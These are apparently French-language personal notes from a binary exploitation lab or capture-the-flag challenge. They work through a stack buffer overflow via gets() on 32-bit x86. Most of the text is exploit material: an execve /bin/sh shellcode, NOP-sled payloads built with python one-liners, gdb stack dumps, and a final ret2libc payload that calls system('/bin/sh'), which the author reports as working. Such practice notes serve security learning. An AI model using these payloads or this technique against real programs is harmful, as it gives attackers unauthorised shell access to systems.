AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
python -c "print('A' * 152 + adresse)"

le shellcode: "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

adresse: 0xffffd690 = \x90\xd6\xff\xff

python -c "print('\x90' * 35 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' * 100 + '\x90\xd6\xff\xff')"

adresse de return de main: 0xf7e45513
son adresse sur la stack: 0xffffde3c
adresse de la stack: 0xffffdd80
adresse de début de la string de gets sur la stack: 0xffffdda0

print du début de la string jusqu'à l'adresse de retour:
```
(gdb) x/40wx 0xffffd680
0xffffd680:	0x41414141	0x00000000	0x00000000	0x00000000
0xffffd690:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd700:	0xf7feb620	0x00000000	0x00000000	0x00000000
0xffffd710:	0xf7fceff4	0x00000000	0x00000000	0xf7e45513
```

8 * 4 * 4 octets vides + '0xf7feb620' + 3 * 4 octets vides + '0xf7fceff4' + 2 * 4 octets vides + l'adresse de retour

0xf7feb620 = \x20\xb6\xfe\f7
0xf7fceff4 = \xf4\xef\xfc\xf7

python -c "print('\x90' * 35 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' * 72 + '\x20\xb6\xfe\xf7' + 'B' * 12 + '\xf4\xef\xfc\xf7' + 'C' * 8 + '\x90\xd6\xff\xff')"

ne marche pas, before et after le gets:
```
(gdb) x/40wx 0xffffd680
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd690:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd700:	0xf7feb620	0x00000000	0x00000000	0x00000000
0xffffd710:	0xf7fceff4	0x00000000	0x00000000	0xf7e45513
(gdb) nexti
0x08048763 in main ()
(gdb) x/40wx 0xffffd680
0xffffd680:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd690:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6a0:	0x6a909090	0x5299580b	0x732f2f68	0x622f6868
0xffffd6b0:	0xe3896e69	0x80cdc931	0x41414141	0x41414141
0xffffd6c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd700:	0x0cfeb620	0x42424237	0x42424242	0x42424242
0xffffd710:	0xfceff442	0x434343f7	0x43434343	0xffd69043
```

avec plus de nops:
python -c "print('\x90' * 103 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' * 4 + '\x20\xb6\xfe\xf7' + 'B' * 12 + '\xf4\xef\xfc\xf7' + 'C' * 8 + '\xd0\xdd\xff\xff')"

dans le env:
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

adresse au milieu nopslide dans env: 0xffffd2ab = \xab\xd2\xff\xff

python -c "print('\x90' * 103 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' * 4 + '\x20\xb6\xfe\xf7' + 'B' * 12 + '\xf4\xef\xfc\xf7' + 'C' * 8 + '\xab\xd2\xff\xff' )"

NOUVELLE METHODE -> RET2LIBC
adresse de "/bin/sh": 0xf7f897ec = \xec\x97\xf8\xf7
adresse de system: 0xf7e6aed0  = \xd0\xae\xe6\xf7
python -c "print('A' * 128 + '\x20\xb6\xfe\xf7' + 'B' * 12 + '\xf4\xef\xfc\xf7' + 'C' * 8 + '\xd0\xae\xe6\xf7' + '\xec\x97\xf8\xf7')"
python -c "print('A' * 128 + '\x20\xb6\xfe\xf7' + 'B' * 12 + '\xf4\xef\xfc\xf7' + 'C' * 8 + '\xd0\xae\xe6\xf7' + 'AAAA' + '\xec\x97\xf8\xf7')"

Ça marche, j'ai perdu 4 jours dessus